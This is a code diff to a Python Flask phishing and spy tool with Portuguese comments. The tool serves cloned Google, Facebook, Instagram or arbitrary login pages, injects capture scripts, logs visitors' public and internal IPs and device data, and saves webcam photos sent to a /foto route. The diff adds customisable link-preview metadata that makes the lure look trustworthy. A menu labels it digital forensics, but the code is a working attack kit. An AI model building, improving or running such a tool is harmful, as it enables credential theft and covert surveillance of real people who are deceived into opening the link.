@@ -1,4 +1,4 @@
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, render_template_string, request, jsonify, send_from_directory
 import datetime, base64, os, requests, shutil
 import pytz
 
@@ -12,11 +12,12 @@ else:
     pasta_raiz = os.path.join(os.getcwd(), "info_spy")
 
 pasta_templates = "templates"
+pasta_preview = os.path.join(os.getcwd(), "static/preview")
 
 if not os.path.exists(pasta_raiz): os.makedirs(pasta_raiz)
 if not os.path.exists(pasta_templates): os.makedirs(pasta_templates)
+if not os.path.exists(pasta_preview): os.makedirs(pasta_preview)
 
-# --- FUNÇÃO PARA LISTAR TEMAS DISPONÍVEIS ---
 def obter_temas():
     temas = {"1": "google", "2": "facebook", "3": "facebook_pc", "4": "instagram"}
     if os.path.exists(pasta_templates):
@@ -28,7 +29,6 @@ def obter_temas():
                 idx += 1
     return temas
 
-# --- MENU DE SELEÇÃO ATUALIZADO ---
 def mostrar_menu():
     os.system('clear' if os.name == 'posix' else 'cls')
     temas_disponiveis = obter_temas()
@@ -36,54 +36,63 @@ def mostrar_menu():
     print("="*40)
     print(" PERÍCIA DIGITAL - SELECIONE O TEMA")
     print("="*40)
-    
     for i in range(1, 5):
         print(f" [{i}] {temas_disponiveis[str(i)].capitalize()} Login")
-    
     print(" [5] Custom (URL - Clonar agora)")
-    
     for k, v in temas_disponiveis.items():
         if int(k) >= 6:
             print(f" [{k}] {v} (Salvo)")
-    
     print("="*40)
 
     opcao = input(" Escolha o template: ")
-    
     url_custom = ""
     if opcao == "5":
         url_custom = input(" Digite a URL para clonar: ")
         if not url_custom.startswith("http"): url_custom = "https://" + url_custom
-        
         salvar = input(" Deseja salvar este clone permanentemente? (s/n): ").lower()
         if salvar == 's':
-            nome_pasta = input(" Digite o nome para a nova pasta (sem espaços): ").replace(" ", "_")
+            nome_pasta = input(" Digite o nome para a nova pasta: ").replace(" ", "_")
             caminho_novo = os.path.join(pasta_templates, nome_pasta)
             if not os.path.exists(caminho_novo): os.makedirs(caminho_novo)
-            
             try:
                 res = requests.get(url_custom, verify=False, timeout=10)
                 with open(os.path.join(caminho_novo, "index.html"), "w", encoding="utf-8") as f:
                     f.write(res.text)
-                print(f"[!] Site salvo com sucesso em templates/{nome_pasta}")
                 return nome_pasta, input(" URL de redirecionamento: "), url_custom
-            except Exception as e:
-                print(f"Erro ao salvar: {e}")
+            except: print("Erro ao salvar.")
 
     link_destino = input(" Digite a URL para redirecionar: ")
-    if not link_destino.startswith("http"):
-        link_destino = "https://" + link_destino
-    
-    if opcao == "5":
-        tema_escolhido = "custom"
-    else:
-        tema_escolhido = temas_disponiveis.get(opcao, "google")
+    if not link_destino.startswith("http"): link_destino = "https://" + link_destino
+    tema_escolhido = temas_disponiveis.get(opcao, "google")
+    if opcao == "5": tema_escolhido = "custom"
         
     return tema_escolhido, link_destino, url_custom
 
 pasta_tema, url_redirecionamento, url_alvo_custom = mostrar_menu()
 
+# --- PERSONALIZAÇÃO DE PREVIEW ---
+print("\n" + "="*40)
+personalizar = input(" Deseja personalizar o preview do link? (s/n): ").lower()
+
+meta_titulo, meta_desc, img_local = None, None, None
+nome_servir = "preview.jpg"
+
+if personalizar == 's':
+    meta_titulo = input(" Título do link: ")
+    meta_desc   = input(" Descrição do link: ")
+    img_local   = input(" Nome da imagem local (ex: foto.jpg): ")
+    if os.path.exists(img_local):
+        shutil.copy(img_local, os.path.join(pasta_preview, nome_servir))
+    print(" [!] Personalização aplicada.")
+else:
+    print(" [!] Usando metadados originais da página.")
+print("="*40 + "\n")
+
 app = Flask(__name__)
+
+@app.route('/preview.jpg')
+def imagem_link():
+    return send_from_directory(pasta_preview, nome_servir)
 
 @app.route('/')
 def index():
@@ -92,41 +101,41 @@ def index():
             res = requests.get(url_alvo_custom, verify=False, timeout=10)
             html_original = res.text
         except Exception as e:
-            return f"Erro ao clonar site: {e}", 500
+            return f"Erro ao clonar: {e}", 500
     else:
         path = os.path.join(pasta_templates, pasta_tema, "index.html")
-        if not os.path.exists(path):
-            return f"Erro: Arquivo {path} nao encontrado!", 404
+        if not os.path.exists(path): return "Arquivo não encontrado", 404
         with open(path, "r", encoding="utf-8") as f:
             html_original = f.read()
     
-    script_config = (
-        f'<script>'
-        f'window.temaAtual = "{pasta_tema}"; '
-        f'window.urlRedirecionamento = "{url_redirecionamento}";'
-        f'</script>'
-    )
+    meta_tags = ""
+    if personalizar == 's':
+        link_da_foto = f"{request.host_url}preview.jpg"
+        meta_tags = (
+            f'<title>{meta_titulo}</title>\n'
+            f'<meta property="og:title" content="{meta_titulo}">\n'
+            f'<meta property="og:description" content="{meta_desc}">\n'
+            f'<meta property="og:image" content="{link_da_foto}">\n'
+            f'<meta property="og:type" content="website">\n'
+        )
+
+    script_config = f'<script>window.temaAtual="{pasta_tema}"; window.urlRedirecionamento="{url_redirecionamento}";</script>'
+    scripts_captura = '\n<script src="/static/js/espiao.js"></script>\n<script src="/static/js/saida.js"></script>\n'
     
-    scripts_captura = (
-        '\n<script src="/static/js/espiao.js"></script>'
-        '\n<script src="/static/js/saida.js"></script>\n'
-    )
-    
-    html_final = html_original.replace('<head>', '<head>' + script_config + scripts_captura)
+    html_final = html_original.replace('<head>', '<head>' + meta_tags + script_config + scripts_captura)
     return render_template_string(html_final)
 
+# --- ROTA DE CAPTURA COM RELATÓRIO ORIGINAL ---
 @app.route('/capturar', methods=['POST'])
 def capturar():
     dados = request.json
     ip_list = request.headers.getlist("X-Forwarded-For")
     ip_publico = ip_list[0] if ip_list else request.remote_addr
     
-    # --- NOVO DADO CAPTURADO: IP INTERNO ---
     ip_interno = dados.get('ip_interno', 'N/A')
-    
-    # --- DATA AJUSTADA PARA PADRÃO BR (DD/MM/AAAA) ---
     agora = datetime.datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")
     
+    # O relatório exato como no seu primeiro código
     log = (f"DATA: {agora} | IP PÚBLICO: {ip_publico}\n"
            f"IP INTERNO (LAN): {ip_interno}\n"
            f"TEMA: {pasta_tema.upper()} | BATERIA: {dados.get('bateria', 'N/A')}\n"
@@ -137,24 +146,20 @@ def capturar():
     caminho_relatorio = os.path.join(pasta_raiz, "relatorio.txt")
     with open(caminho_relatorio, "a") as f:
         f.write(log)
-    print(f"[+] Evidência salva em: {caminho_relatorio} (Horário BRT: {agora})")
+    print(f"\033[92m[+] Evidência salva em: {caminho_relatorio} (Horário BRT: {agora})\033[0m")
     return jsonify({"status": "ok"}), 200
 
 @app.route('/foto', methods=['POST'])
 def foto():
     try:
-        dados = request.json
-        img_str = dados['image'].split(",")[1]
-        img_data = base64.b64decode(img_str)
-        # --- NOME DA FOTO AJUSTADO ---
+        img_data = base64.b64decode(request.json['image'].split(",")[1])
         hora_atual = datetime.datetime.now(fuso_br).strftime('%d-%m-%Y_%H%M%S')
         nome_foto = f"foto_{hora_atual}.jpg"
         caminho_foto = os.path.join(pasta_raiz, nome_foto)
         with open(caminho_foto, "wb") as f:
             f.write(img_data)
         return "OK", 200
-    except Exception as e:
-        return "Erro", 500
+    except: return "Erro", 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
